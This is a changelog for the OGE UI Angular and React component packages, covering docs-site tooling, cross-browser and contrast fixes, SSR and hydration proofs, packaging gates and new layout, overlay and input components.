# Changelog

Notable changes to the OGE UI packages. Versions are tagged per package
(`grid@0.8.0`, `core@0.8.0`, …); entries below group them by release wave.
Maintained by hand: `nx release` disables its workspace changelog when projects
are versioned independently, which is the case here.

## Unreleased

### Docs site — token reference, ThemeBuilder, DTCG tokens (W6c)

- **`/getting-started/tokens`**: every `--oge-*` design token in one table —
  default, dark, high-contrast, Tailwind and Bootstrap values with colour
  swatches (computed tints resolved per theme), the category (colour, spacing,
  radius, typography, elevation, z-index, component) and the packages whose
  stylesheets read it. Filter by text or category, copy a name, link to any
  row (`#oge-accent`). Generated at build time from `_tokens.scss` and
  `themes/*.css`, so it cannot drift from what ships. Tokens are also a
  **Tokens** group in the Ctrl/⌘K search.
- **`/getting-started/theme-builder`**: start from Default, Dark, High
  contrast, Tailwind or Bootstrap; edit accent, background, surface, text,
  muted, border and the severity colours with OGE's own colour box, plus
  radius, density and font; watch a live preview of real components (buttons,
  select box, date box, tabs, grid, toasts). WCAG AA contrast is checked as
  you edit (text on surfaces, accent text, text on accent and severity
  fills). Export as `:root` CSS, a scoped `[data-oge-theme='…']` theme (with
  the derived tints re-declared) or DTCG JSON — copy or download. The state is
  kept in the URL (shareable link) and on the device. The tokens are shared by
  both render layers, so the theme styles React identically.
- **`@oge-ui/core/tokens.json`**: the light, dark and high-contrast themes in
  the Design Tokens Community Group format (2025.10 — `$value` / `$type`,
  sRGB colour objects with a `hex` fallback, `{ value, unit }` dimensions,
  aliases kept as aliases, computed tints with their CSS in `$extensions`),
  for design tools and token pipelines. Also served at
  `https://www.ogeui.com/tokens.json`.
- Tooling: `tools/docs-tools/lib/tokens.mjs` generates the table data, the
  builder presets and `tokens.json` through `npx nx run docs-tools:llms`;
  `llms-check` fails when a token, a theme or a package's token usage changes
  without regenerating. Both pages are lazy; the docs site's initial bundle
  grew by about 0.3 kB (gzip) for the two sidebar entries and the search
  group.

### Cross-browser fixes — `@oge-ui/behavior` (grid / tree list, both layers), `@oge-ui/core` (themes), `@oge-ui/layout`, `@oge-ui/navigation`, `@oge-ui/inputs`, `@oge-ui/forms`, `@oge-ui/kanban`, `@oge-ui/gantt`

- **A million-row grid scrolls to its last row in every browser.** The
  virtual body was laid out at rows × row height; past an engine's element
  height cap that broke — Firefox (~17.9M px) dropped the height outright,
  so the 1M-row remote grid could not scroll beyond its first screen, and
  Chromium / WebKit clamp at 2^25 px, leaving the last ~70k rows
  unreachable. Above 15M px the body is now compressed and scroll positions
  are scaled into the row space (window, row placement, `scrollRowIntoView`,
  scroll anchoring) — Angular and React grids and tree lists alike.
- **AA contrast for labels on soft fills.** Avatar and chip-avatar
  initials (`--oge-avatar-fg`, every theme), the pressed toolbar toggle and
  open toolbar menu button, the gantt toggle, the active drawer item, the
  colour-gradient contrast badges, the validation summary title and the
  kanban WIP count now use the accent / severity colour deepened a fifth
  toward the text colour (4.24–4.48:1 → ≥ 5:1); the WIP limit no longer
  drops below 3:1 through an extra opacity.
- **A disabled field's hint stays readable** — it is usually the reason
  the field is disabled; it was dimmed with the field to 2.3:1.
- Docs demos: dimmed text inside components uses `--oge-muted-color`, the
  scheduler drag-in backlog is a button group (not a `<ul>` of
  `role=button` items), the vertical-grouping scheduler demo keeps 30-min
  appointments at a 24px target, and the React accordion demos keep clear
  space under their checkboxes.
- Tests: the WebKit-only failures (SVG text geometry, mid-transition
  colours, key presses racing focus), the infinite-scroll skeleton race,
  the axe crawl racing the header's deferred selects, and the visual
  regression spec's locators (every shot used to time out) are fixed;
  `node tools/e2e/visual.mjs --local` dry-runs the shots without Docker.

### Docs site — search, changelog, bundle size (W6a)

- **Search the docs with Ctrl/⌘K** (or `/`, or the header's search button).
  One palette finds pages, section headings and every API member — inputs,
  outputs, props, methods and types from the API reference tables — grouped
  into Pages / Sections / API and ranked prefix first, then word start, then
  substring. Results for the framework you are reading come first; the rest
  say which layer they are in, and opening one switches the site to it.
  Arrow keys, Enter and Escape follow the WAI-ARIA combobox pattern; recent
  picks are remembered on the device. The palette and its index load only
  when you first open it; the docs site's initial bundle grew by about 1 kB
  (gzip) for the button and the shortcuts.
- **`/changelog`**: this file, rendered on the site with a link per release
  and per change group; the sidebar and footer version badges open it.
- **`/bundle-size`**: the gzip size of every published entry point — the
  baseline CI enforces — grouped by package, marked MIT or commercial,
  sortable and filterable, with how the budgets are enforced.
- Tooling: the search index (`apps/dev-app/public/search-index.json`) is
  generated by `npx nx run docs-tools:llms` and checked by `llms-check`; the
  ADR 0003 commercial list moved to `tools/commercial-families.json`, read by
  both the license-boundary gate and the bundle-size page.

### Leftovers — Gantt RTL, rotated chart labels, pivot header format, audit

- **Gantt: the context menu and the drawn exports mirror in RTL**
  (`@oge-ui/gantt-engine`, `@oge-ui/gantt`, `@oge-ui/react-gantt`). The
  built-in context menu opens from the inline-start edge — towards the left of
  the pointer in RTL — and now runs the APG menu keys (Up/Down/Home/End,
  Escape); the arrow pointing back towards the row (Left in LTR, Right in
  RTL) closes it and returns focus to the row (`ganttMenuKeyCommand`).
  Shift+F10 / the ContextMenu key opens it from a focused row.
  `getExportData()` carries `rtl`: the PNG and PDF builders mirror the picture
  (title column on the right, timeline right to left, right-aligned text) and
  the Excel builder writes a right-to-left sheet; each takes an `rtl` option
  that overrides it. MS Project XML is direction-neutral data and is
  unchanged.
- **Charts: measured axis labels, exact overlap on rotated charts**
  (`@oge-ui/charts-engine`, `@oge-ui/charts`, `@oge-ui/react-charts`). Both
  render layers measure argument labels in the chart's own svg
  (`createChartLabelMeasure`; the character estimate before the first render,
  in SSR and in jsdom), so `label.overlap` decides on real text boxes in both
  orientations. On a rotated chart's vertical argument axis a label wider than
  the side band wraps (up to three lines, the last ellipsized, centred on its
  tick), `hide` / `skip` compare the real line boxes and `stagger` alternates
  two columns instead of falling back to `skip`. New "Rotated labels" demo.
- **Pivot: `headerFormat` for member headers** (`@oge-ui/pivot-engine`,
  `@oge-ui/pivot`, `@oge-ui/react-pivot`). A row / column field's
  `headerFormat` — a function or a declarative `OgeValueFormat` — writes its
  member headers and wins over `format` there, which keeps formatting the
  field's cells when it is dragged into the data area. A date format on a
  date-grouped field names the bucket (`{ type: 'date', pattern: 'MMMM' }`
  turns month `1` into `January`, `Ocak` in tr-TR). Headers, label filters,
  the chart adapter, remote members without a server `text` and the
  Excel / PDF / CSV exports read the same text.
- **Audit.** `http-cache-semantics` 4.3.0 (2026-10-04) patches
  GHSA-ch52-4w7c-c8xp, so a targeted `overrides` entry replaces its allowlist
  entry. `braces` still has no release above 3.0.3 (GHSA-vfj7-8cjw-p6xm); its
  entry was re-checked and extended to 2026-12-06.

### Docs site

- **Framework-neutral titles, descriptions and copy.** The site, its page titles, meta descriptions, home and getting-started copy, the README and the `llms.txt` summary now present OGE as one suite for Angular and React; a page only one layer covers (the router-driven demos) keeps its framework in the title.

## 1.1.3 — 2026-10-07

Forty-five packages, including the new MIT `@oge-ui/editor` and `@oge-ui/react-editor`. New components (layout and feedback, inputs, charts, carousel / list / tile layout, rich-text editor), overlay / navigation / BPMN depth, scheduling depth and time zones, ready-made translations, SSR and hydration proof, release and packaging gates, and the cross-browser test matrix.

### Leftover fixes — form editor types, list box reordering, transfer list, header, API reports

- **Forms: seven new editor types** (`@oge-ui/forms`, `@oge-ui/react-forms`,
  `@oge-ui/behavior`). `editorType` now also takes `rating`, `otpInput`,
  `signaturePad`, `listBox`, `transferList`, `mention` and `richText` (the
  `@oge-ui/editor` rich-text editor). The rating and the signature pad are bare
  controls, so the form draws their label and error; the others keep their
  own. New curated `editorOptions`: `precision`, `length`, `masked`,
  `signatureFormat`, `selectionMode`, `height`, `sourceTitle`, `targetTitle`
  and `trigger`. The heavier editors load only when an item uses them:
  Angular renders them inside `@defer`, React loads `@oge-ui/react-editor`
  with `React.lazy`. Both forms packages gain a dependency on their layer's
  editor package (MIT).
- **List box reordering** (`@oge-ui/inputs`, `@oge-ui/react-inputs`,
  `@oge-ui/behavior`). `allowReordering` on `oge-list-box` / `<OgeListBox>`:
  Alt+↑/↓ moves the focused option, a pointer drag drops it before or after
  another (touch after a long press), through the cancelable `reordering` →
  `reordered` pair and a live announcement (`listBoxReorderedAnnouncement`,
  translated in all ten locale packs). New `reorderItem()` method. The
  transfer list opts in per side (`allowReordering: true | 'source' |
'target'`): one drag reorders inside its own list and still moves over the
  other; reordering the target reorders the value.
- **Transfer list buttons follow the search.** "Move all" is enabled only
  while the filtered view holds a movable item and "move selected" only while a
  selected item is visible — what the buttons actually move. They used to be
  judged on the unfiltered lists.
- **Action sheet: Escape right after opening** (`@oge-ui/overlay`,
  `@oge-ui/behavior`). An Escape pressed in the frame between `open()` and the
  sheet rendering was lost; the sheet now joins the Escape stack the moment it
  opens (`OgeActionSheetCore.arm()`, new), and its `open()` promise resolves
  with `null`.
- **React tree list and grid: the initial filter loads once**
  (`@oge-ui/react-tree-list`, `@oge-ui/react-grid`). `filterValue` /
  `defaultFilterValue` used to be applied in an effect after mount, so the
  first render loaded unfiltered and then reloaded; it is now part of the first
  synchronous load (the server render shows the filtered rows too). The React
  grid also honours `defaultFilterValue`, which it documented but ignored, and
  no longer reports the initial value through `onFilterValueChange`.
- **List view: focus survives a virtual scroll in plain-list mode**
  (`@oge-ui/layout`, `@oge-ui/react-layout`, `@oge-ui/behavior`). With
  `selectionMode: 'none'` and `virtualScroll`, wheel-scrolling the focused row
  out of the window dropped focus to the page. Focus now waits on the list's
  scroll viewport and returns to the row when it scrolls back; the viewport is
  the list's tab stop while the active row is not rendered.
- **Public API reports** for `@oge-ui/core` and `@oge-ui/behavior`: API
  Extractor reports of every entry point in `tools/api-reports/`, checked by
  `npx nx run @oge/source:api-check` in CI verify after the builds;
  `node tools/api-report.mjs --update` rewrites them for an intended change.
- Docs: at 320px the docs header was ~20px wider than the screen once
  hydrated; below 25rem the framework switch shows only the marks (the words
  stay its accessible names) and the row's padding tightens. The phone-width
  e2e checks now hold the header to 320px, before and after hydration.
- Docs: the home page's component index ends on a full row at every width — a
  closing "Browse all components" tile spans the columns the last row leaves
  free.

### Test matrix, visual regression and coverage (W5b) — `@oge-ui/core` (themes), `@oge-ui/gantt-engine`, `@oge-ui/scheduler`, `@oge-ui/react-scheduler`, `@oge-ui/inputs`

Testing depth, plus the library bugs it surfaced:

- **Browser matrix.** The e2e config gains `firefox`, `webkit`,
  `mobile-chrome` (Pixel 7) and `mobile-safari` (iPhone 14) projects, opted
  into with `OGE_E2E_BROWSERS`; the default run stays chromium. Pull requests
  run an `@smoke` subset (about twenty tests across the families, including
  a touch drag on the phones) on the four new projects; a new nightly
  workflow runs the whole suite on every project, sharded, with
  `failOnFlakyTests` on. Tests that need CDP or Chromium-only permissions
  say so with an explicit `test.skip(browserName !== 'chromium', reason)`.
- **Visual regression.** `toHaveScreenshot` baselines of the main components
  in light, dark and high contrast, in both render layers where React exists
  (`apps/dev-app-e2e/visual`). The browser always runs in the official
  Playwright Docker image (`npm run e2e:visual` / `npm run e2e:visual:update`,
  and the CI `visual` job), so one baseline set holds on every machine.
- **Coverage ratchet.** CI runs the unit tests under V8 coverage, and every
  package's vitest config carries `coverage.thresholds` one point under its
  measured level. Perf-budget specs scale their time budgets under
  instrumentation.
- **Accessibility.** A new `contrast.spec.ts` runs axe `color-contrast` over
  the components (light and dark) on the representative pages, the
  per-route axe crawl (WCAG 2.0 A – 2.2 AA tags, components' contrast
  included) runs nightly over every sitemap route, and a token unit test
  holds the default and dark palettes to AA.
- **Property-based engine specs** (seeded generator, no new dependency):
  pivot totals equal the sum of their cells, gantt scheduling honours every
  link and is a fixpoint, BPMN import → export → import is stable.

Fixed along the way:

- **Gantt: FF / SF links on a work calendar** could leave the successor
  finishing before the link allowed (a dependency conflict right after
  auto-scheduling), and a second scheduling pass then moved it again. The
  forward pass now counts the successor's working days back from the
  required finish and steps to the earliest start whose finish holds.
- **Contrast (tokens, every theme).** `--oge-muted-color` read at 2.6:1 on
  white (pager info, calendar weekdays and other-month days, empty states,
  toolbar text buttons, scheduler hour labels) — now `#636b78` (≥ 4.7:1 on
  every light surface); dark `#9ca3af`; Tailwind theme `slate-500`. White on
  the success and warning fills read at 3.2–3.3:1 — `--oge-success` is now
  `#15803d`, `--oge-warning` `#b45309` (Tailwind theme: the `-700` shades).
  The selected toggle-group item's accent label on its soft fill rose from
  4.3:1 to AA.
- **Scheduler.** The primary "New" toolbar button rendered its white label on
  the transparent toolbar pill (1.1:1); it keeps its accent fill now. Text on
  accent fills (active view, today markers, primary buttons) follows
  `--oge-severity-contrast` instead of a hard-coded white, so the dark theme's
  light accent gets dark text. Timeline bars painted in an appointment colour
  pick a readable label colour, as the other chips already did (both layers).

### SSR follow-ups — editor surface, React grid first page, phone-width fixes — `@oge-ui/behavior`, `@oge-ui/core`, `@oge-ui/editor`, `@oge-ui/react-editor`, `@oge-ui/react-grid`, `@oge-ui/react-tree-list`

Closes the gaps the W5a SSR proof listed:

- **The rich-text editor server-renders its document** (both layers). The
  editing surface used to be empty in the server markup. Angular now builds
  it on the server from the model with the same `createElement` routine the
  browser uses (`OgeEditorCore.renderTo`, new), and the browser's editor
  **adopts** every server-built block that matches its model instead of
  rebuilding it. React renders the first surface as React elements from the
  same render tree, then hands it to the editor machine after mount, before
  the first paint. Hydration matches in both layers, under StrictMode too,
  and there is still no `innerHTML` or `dangerouslySetInnerHTML`.
- **The editor reads HTML on a server.** Where `DOMParser` is missing (Node),
  the bound value, `ogeSanitizeEditorHtml()` and `ogeEditorHtmlLength()` used
  to keep only the text. They now go through the editor's own small,
  environment-independent tokenizer, which feeds the same allow-list walker,
  so formatting survives. `OgeEditorParseOptions.parser: 'portable'` (new)
  forces that tokenizer in the browser as well; the React adapter loads its
  initial value this way so the server and the hydrating browser hold the
  same model. The XSS corpus also runs through the portable tokenizer.
- **The React grid and tree list server-render their first page.** An
  in-memory array, or any source with the new optional
  `DataSource.loadSync()` (`ArrayDataSource` implements it), is loaded during
  the first render with the option props (paging, initial sort and grouping,
  summaries) already applied, through `OgeGridDataCore.syncNow()` (new). The
  mount effect adopts that same source, so nothing reloads and no loading
  state flashes. Remote and lazy sources still load after mount.
- `OgeGridDataCore.setSource()` given the source it already holds now keeps
  that source's push subscription; it used to drop it.
- Docs: the deferred header selects' placeholders ignored `max-sm:hidden`
  (an unlayered rule beat the utility), so every prerendered page was 214px
  too wide on phones until hydration. A phone-width check of the server HTML
  with JavaScript off (`ssr/phone-width.spec.ts`) and a wider route list in
  `visual-states.spec.ts` now guard this. The transfer list and the other
  W8a–W8e component pages were checked at 390px in both frameworks and none
  of them overflow.
- Docs: the tag box avatar demos use PNG files (`/avatars/*.png`) instead of
  SVG `data:` URLs, which `sanitizeResourceUrl` rightly rejects, so the React
  demo shows them again. The Angular and React demos use the same data.

### Release and packaging gates (W5c)

The npm payloads (`dist/packages/**`) are now checked before they can ship,
and the packaging defects the checks found are fixed.

- **Fixed — rollup packages** (`@oge-ui/core`, `@oge-ui/behavior`,
  `@oge-ui/locales` and the six `*-engine` packages): the `import` condition
  pointed at `index.esm.js`, an ES module inside a package without
  `"type"`, so Node loaded it as CommonJS (a `MODULE_TYPELESS_PACKAGE_JSON`
  warning and a re-parse on Node ≥ 22, a syntax error on older Node). Each
  entry is now `{ types, module, default }`: bundlers take the ESM build
  through `module`, Node takes the CommonJS build, and the types match
  both. `@oge-ui/core` gains an `exports` map (`.`, `./themes/*`,
  `./llms.txt`, `./package.json`); every package exports `./package.json`.
- **Fixed — React packages** (all eighteen `@oge-ui/react-*`): the single
  `.d.ts` tree described the CommonJS entry as ESM ("masquerading as ESM")
  and used extension-less relative imports that do not resolve under
  `node16` / `nodenext`. The build now writes explicit `.js` specifiers
  and a `.d.cts` twin (`tools/react-package/dual-types.mts`), and the
  exports map carries `import.types` / `require.types` separately.
- **`package-check`** (`tools/package-check.mjs`): `publint` and
  `@arethetypeswrong/cli` on every publishable package (Angular Package
  Format packages are checked ESM-only by design); by-design findings go in
  `tools/package-check-allowlist.json` with a reason (empty today).
- **`license-boundary-check`**: no MIT package may depend on — or, in its
  built JavaScript, import — a commercial package (ADR 0003 list), and
  every `license` field and `LICENSE` file must match that list.
- **`size-check`**: gzip budgets per published entry point, generated from
  the dist folders, baseline in `tools/size-budgets.json`, fails on more
  than 10 % growth.
- **Release workflow** (`.github/workflows/release.yml`): manual or `v*`
  tag; builds, runs the gates, publishes in dependency order with npm
  trusted publishing and `--provenance`, inside the protected
  `npm-publish` environment, and attaches a CycloneDX SBOM to the GitHub
  release.
- **Commit lint** on pull requests (`commitlint.config.mjs`, conventional
  commits; accepts the repo's `merge:` and multi-type headers).

### Carousel, action sheet, list / data view and tile layout (W8d) — `@oge-ui/layout`, `@oge-ui/overlay`, `@oge-ui/react-layout`, `@oge-ui/react-overlay`, `@oge-ui/behavior`, `@oge-ui/locales`

Five new components in both render layers; their decisions (index and
layout arithmetic, keyboard maps, ARIA shapes, timers, state validation, the
modal machine) live in `@oge-ui/behavior` cores, so the two layers only draw
markup:

- **Carousel** (`@oge-ui/layout/carousel`, `<OgeCarousel>`): the WAI-ARIA APG
  carousel — a labelled region with `aria-roledescription="carousel"`, slides
  named "Beach, 2 of 5", off-screen slides `inert`. Data-driven `items` (image
  - frosted caption, `[ogeCarouselSlideTemplate]` / `renderSlide`) and
    declarative `oge-carousel-slide` / `<OgeCarouselSlide>` children; previous /
    next buttons (`aria-disabled` at the ends, so they keep focus); a dot or
    thumbnail picker that is an APG tab list with one slide per view and a row
    of `aria-current` buttons with several (`slidesPerView`, `gap`); `loop`
    (rewinds, never clones slides); autoplay that pauses on hover and while the
    tab is hidden, **stops** when keyboard focus enters, always renders its
    rotation control first (WCAG 2.2.2), turns the slides' `aria-live` off while
    rotating and starts stopped under `prefers-reduced-motion`. The track is a
    script-driven scroll-snap container; touch, pen and mouse swipes run on the
    shared `beginPointerGesture` (vertical pans still scroll the page, Escape
    cancels) and RTL mirrors the picker keys and offsets. `[(selectedIndex)]`,
    `slideChanged` (with its `source`), `autoplayChanged`, `next()` /
    `previous()` / `goTo()` / `play()` / `pause()` / `focus()`.
- **Action sheet** (`@oge-ui/overlay`, `<OgeActionSheet>` in
  `@oge-ui/react-overlay`): a bottom sheet of actions — icons, descriptions,
  destructive and disabled rows, a `bottom` group after a divider, a Cancel
  button — as a modal `role="dialog"` labelled by its title and portaled to
  `<body>`, on `OgeActionSheetCore`: the shared focus trap, ref-counted scroll
  lock, inert background, overlay Escape stack and focus restore, backdrop
  dismissal and a swipe down from the handle on `beginPointerGesture`. The
  actions are an APG menu (one tab stop, ↑/↓ wrap past disabled rows,
  Home / End). `[(opened)]`, cancelable `opening` / `closing` (with the close
  `reason`), `closed`, `itemClick` (`keepOpen`), an item template / render
  prop, and `open()` returning a promise of the chosen action. The bottom edge
  pads with `env(safe-area-inset-bottom)`; on wide screens the sheet floats.
  New optional overlay messages `actionSheetCancel` / `actionSheetLabel`.
- **List view** (`@oge-ui/layout/list-view`, `<OgeListView>`): a templated list
  that is an APG listbox when it selects (single / multiple, Shift ranges,
  Ctrl+A, `aria-activedescendant` — the focus model that survives windowing)
  and a roving-tab-stop list when it does not; sticky labelled group headers;
  fixed-height virtual scrolling for 10 000+ rows on core's `OffsetTree`; a
  search field with accent-insensitive matching and announced result counts;
  a load-more button or infinite scroll with announced arrivals; swipe / hover
  item actions with `aria-keyshortcuts` keyboard twins.
- **Data view** (`@oge-ui/layout/data-view`, `<OgeDataView>`): templated items
  in responsive columns resolved by a container query on the view's own width
  (or one per row), a grid / list layout switch, folded multi-word search,
  locale-aware sorting, a filter hook, a built-in pager on behavior's
  pagination decisions with focus management and announcements, remote
  operations through `optionsChanged`, loading skeletons, and optional
  single / multiple selection as an APG listbox with 2-D keyboard navigation.
- **Tile layout** (`@oge-ui/layout/tile-layout`, `<OgeTileLayout>`): a
  dashboard of tiles on a CSS grid with column and row spans, drag-by-header
  reordering and corner-handle resizing on the shared pointer gesture (Escape
  cancels), and keyboard twins — Ctrl+Arrow moves, Ctrl+Shift+Arrow resizes,
  mirrored in RTL and announced through the shared live region. Cancelable
  `reordering` / `resizing` → `reordered` / `resized` → `layoutChanged` fire
  identically for pointer, keyboard and API; a serializable `[(state)]` with
  `getState()` / `applyState()` passes through the `sanitizeOgeTileLayoutState`
  validator. Declarative `oge-tile-layout-item` children or the `items` twin,
  header / content slots or render props; one column below 480px of its own
  width.
- **Locales**: new `layout.carousel`, `layout.listView`, `layout.dataView` and
  `layout.tileLayout` slices plus the two overlay keys, translated in all ten
  packs and wired into `provideOgeLocale()` / `<OgeLocaleProvider>`.
- **Packaging**: `@oge-ui/react-layout` now declares its `@oge-ui/core`
  dependency (the list and data views format plural messages and run the
  type-ahead buffer from it) and keeps it external in the build.
- **Docs**: overview and API pages for both frameworks (`/components/carousel`,
  `/list-view`, `/data-view`, `/tile-layout`, `/overlay/action-sheet`), gallery
  cards, landing tiles, Playwright + axe specs and regenerated `llms.txt`
  files. The React demos load only their component's stylesheet, keeping every
  demo inside the `anyComponentStyle` budget.

### SSR and hydration proof (W5a) — `@oge-ui/behavior`, `@oge-ui/bpmn-engine`, `@oge-ui/bpmn`, `@oge-ui/gantt`, `@oge-ui/react-overlay`, `@oge-ui/react-gantt`, `@oge-ui/react-scheduler`, `@oge-ui/react-inputs`

Every SSR / hydration claim in the docs is now backed by a test, and the
tests surfaced six library fixes:

- **React popup ids are SSR-safe.** `useAnchoredPanel` derives `panelId`
  from `useId()` instead of the panel machine's module counter
  (`OgeAnchoredPanelCoreOptions.id`, new). The drop-down button's and the
  scheduler date navigator's `aria-controls` are server-rendered, so the
  counter made every SSR page with one hydrate with a mismatched attribute
  (and pointed `aria-controls` at nothing).
- **Clock-dependent decoration waits for hydration (React).** The Gantt today
  marker and the scheduler's now-line are positioned from the wall clock; a
  page hydrated minutes after it was rendered put them at a different pixel
  and React reported a mismatch. They now render from the first post-hydration
  frame (`useSyncExternalStore`); a client-only mount still paints them in its
  first frame.
- **`<select>` options carry their selection in server HTML.** The Gantt
  toolbar / dependency editor and the BPMN properties panel bind
  `[attr.selected]` beside `[selected]`: the server DOM has no `selected`
  property, so the prerendered markup showed the first option until
  hydration.
- **Direction observers use the element's own window.** `observeDirection`
  (`@oge-ui/behavior`) and its BPMN twin look up `MutationObserver` on the
  element's `defaultView`: a server DOM has none (nothing observed), and a
  process that holds a server DOM beside jsdom no longer hands one realm's
  node to the other's observer — the BPMN editor's constructor threw there.
- **Unsafe item images render no `src` (React inputs).** The select box,
  autocomplete and tag box passed an image URL `sanitizeResourceUrl` rejects
  (an SVG `data:` URL, say) through as `about:blank`, which an `<img>` then
  loads — a violation under any strict `img-src`. They now omit `src`, as
  the signature pad already did.
- **Docs site hydrates** (`provideClientHydration(withEventReplay())`) — all
  146 prerendered routes, Angular and `?framework=react`, with a silent
  console under the production CSP.

Known issue (Angular 22.2, upstream): with `withEventReplay()`, Angular
inserts the replay bootstrap `<script>` into `<body>` after computing the
hydration annotations, so nodes it locates by a path from `<body>` — content
projected into `<oge-tab>` / `<oge-step>` and rendered by `<oge-tab-panel>` /
`<oge-stepper>` — are one sibling off and the client fails with NG0509. The
docs fold the call into the contract script from a `BEFORE_APP_SERIALIZED`
hook (`apps/dev-app/src/app/event-replay-script.ts`); an SSR app using those
components with event replay needs the same hook, or the template form
(`ogeTabContentTemplate`). `apps/ssr-smoke` pins the bug so the workaround is
dropped once Angular fixes the ordering.

The proof (ARCHITECTURE → "SSR and hydration"): `apps/ssr-smoke` — a
`renderApplication` smoke render per Angular family in plain Node, an Angular
hydration round trip per family, and a React `renderToString` (Node) →
`hydrateRoot` (StrictMode) spec per React family; `apps/dev-app-e2e/ssr` —
the hydration crawl over every prerendered route and a strict-CSP + Trusted
Types run (`npx nx run dev-app-e2e:e2e-ssr`, new `e2e-ssr` CI job);
`tools/check-use-client.mjs` (`npx nx run @oge/source:use-client-check`,
CI verify) — every React dist file leads with `'use client'`.

### Layout and feedback components (W8a) — `@oge-ui/layout`, `@oge-ui/buttons`, `@oge-ui/react-layout`, `@oge-ui/react-buttons`, `@oge-ui/behavior`, `@oge-ui/locales`

Seven new components in both render layers, each a secondary entry with its
decisions in a shared `@oge-ui/behavior` core:

- **Avatar and avatar group** (`@oge-ui/layout/avatar`): image → initials →
  icon fallback chain (`ogeResolveAvatarContent`, locale-aware initials),
  five sizes, circle / rounded / square, a presence dot spoken through the
  accessible name (`withStatus`), `decorative` for avatars next to a visible
  name, `imageLoaded` / `imageFailed`. The group stacks items or projected
  avatars, folds the rest into a "+N" surplus avatar (`max` counts it, `total`
  covers partially loaded lists) and passes size and shape down.
- **Badge** (`@oge-ui/layout/badge`): count (with a `max` — "99+"), dot or
  short text, stand-alone or overlaid on any content at four logical corners
  (`overlap: 'circle'` for round hosts), severities, `showZero` / `invisible`.
  The glyph is `aria-hidden`; a plural-aware description ("5 new items") is
  wired into the anchored control's `aria-describedby`, and `announce` speaks
  changes in a polite live region.
- **Chip and chip list** (`@oge-ui/layout/chip`): stand-alone chips that toggle
  (`aria-pressed`) or remove (a real ✕ button, Delete / Backspace), icons and
  leading avatars; a data-driven list that renders the APG listbox when it
  selects (single / multiple, roving focus, `aria-keyshortcuts` for removal),
  a layout grid when it only removes, a plain list otherwise. Cancelable
  `itemRemoving`, `itemRemoved`, `selectionChanged`, `itemClick`, focus that
  follows a removal, and a chip template / render prop.
- **Alert** (`@oge-ui/layout/alert`): inline info / success / warning / error
  message with a title, an actions slot, a custom icon slot and a dismiss
  button; `role="alert"` for errors and warnings, `role="status"` otherwise
  (`live` overrides, `off` for permanent notes); soft / outlined / filled;
  cancelable `closing`, `closed`, `[(visible)]`, `show()` / `close()`; focus
  moves on when the dismissed alert held it.
- **Timeline** (`@oge-ui/layout/timeline`): an ordered list, vertical or
  horizontal, items on the start or end side or alternating, an opposite
  column, severity markers with icons and an outlined variant, `Date` times
  formatted in the locale inside `<time datetime>`, and content / marker /
  opposite templates (render props in React).
- **App bar** (`@oge-ui/layout/app-bar`): top or bottom bar with start / center
  / end sections, static / sticky / fixed placement padded with
  `env(safe-area-inset-*)`, default / primary / inverse / transparent colours,
  three sizes, an elevation, and an opt-in landmark (`banner`,
  `contentinfo`, `navigation`, `region`).
- **Floating action button and speed dial** (`@oge-ui/buttons/fab`, the
  buttons package's first secondary entry): six pinned positions with
  safe-area insets, fixed / absolute / static modes, three sizes, an extended
  label; the speed dial follows the APG menu-button pattern (arrow keys along
  the dial axis, RTL-aware, wrap, Escape returns focus, Tab closes), unfolds
  away from its edge or in an explicit direction, opens on click or hover and
  shows its action labels on hover, always or never.
- **Tokens**: `--oge-avatar-bg` / `--oge-avatar-fg` (derived, every theme),
  `--oge-z-fab` (800) and `--oge-z-app-bar` (700).
- **Locales**: new `layout.avatar`, `layout.badge`, `layout.chip`,
  `layout.alert` and `fab` slices translated in all ten packs and wired into
  `provideOgeLocale()` / `<OgeLocaleProvider>` (the avatar, badge and timeline
  configs also take the pack's `locale`).
- **Docs**: overview and API pages for both frameworks (`/components/avatar`,
  `/chip`, `/alert`, `/timeline`, `/app-bar`, `/buttons/fab`), gallery cards,
  landing tiles and regenerated `llms.txt` files.

### Input components (W8b) — `@oge-ui/inputs`, `@oge-ui/react-inputs`, `@oge-ui/behavior`, `@oge-ui/locales`

Six new editors, each a secondary entry point of `@oge-ui/inputs`
(`rating`, `otp-input`, `signature-pad`, `list-box`, `transfer-list`,
`mention`) with a React twin in `@oge-ui/react-inputs`. The logic is shared
through new `@oge-ui/behavior` cores, so both layers run the same code.
Every editor works with `[(value)]`, Signal Forms `[formField]` and reactive /
template forms (CVA) in Angular, and with a controlled / uncontrolled pair in
React. All strings are in `OgeInputsMessages`, translated in all ten locale
packs.

- **Rating** (`oge-rating` / `<OgeRating>`): `0`…`max` in steps of
  `precision` (half stars, tenths for averages), `null` = not rated; an APG
  slider by default (arrows follow the reading direction, PageUp/PageDown,
  Home/End, digits, Delete clears) or `semantics="radiogroup"` with a roving
  tab stop; clear on re-click (`allowClear`), hover preview (`hoverChanged` /
  `onHoverChange`), `icon` star / heart / circle, `selection` continuous /
  single, item templates rendered in an empty and a clipped filled layer so
  fractional fills work with any markup. Core: `rating-core.ts`.
- **OTP input** (`oge-otp-input` / `<OgeOtpInput>`): `length` cells in one
  labelled group with a single Tab stop, `numeric` / `alphanumeric` /
  `alphabetic` (script and full-width digits fold to ASCII), `letterCase`,
  `masked`, `groupSize` separators, paste and SMS autofill
  (`autocomplete="one-time-code"`) distributed over the cells, Backspace /
  Delete / arrow rules, `completed` / `onCompleted`. The value is always a
  contiguous prefix. Core: `otp-core.ts`.
- **Signature pad** (`oge-signature-pad` / `<OgeSignaturePad>`): pointer
  drawing on `beginPointerGesture` (a tap is a dot, Escape cancels a stroke),
  speed-based smooth strokes stored surface-normalized so resizes redraw
  exactly, undo / clear, PNG or SVG data URL value (`toDataUrl()`, `toSvg()`;
  PNG falls back to SVG without a canvas), a keyboard-accessible typed
  signature mode, read-only. Stored SVG values round-trip as editable
  strokes; external images go through `sanitizeResourceUrl` in both layers.
  Core: `signature-core.ts`.
- **List box** (`oge-list-box` / `<OgeListBox>`): an APG listbox
  (`aria-activedescendant`) with single / multiple selection, Shift ranges,
  Ctrl+A, check boxes, groups, search, type-ahead, item / group templates and
  `selectionChanged` with added / removed items. `OgeListBoxCore` extends the
  select box's `OgeSelectListCore`, so expressions, search and grouping are
  the same code.
- **Transfer list** (`oge-transfer-list` / `<OgeTransferList>`): two list boxes
  with move selected / all buttons, Ctrl/⌘+arrow shortcuts and pointer drag
  between the lists — one cancelable `moving` → `moved` path for all three,
  announced through the shared live announcer; per-list search and counts,
  stacks below 520px of its own width. Core: `transfer-list-core.ts`.
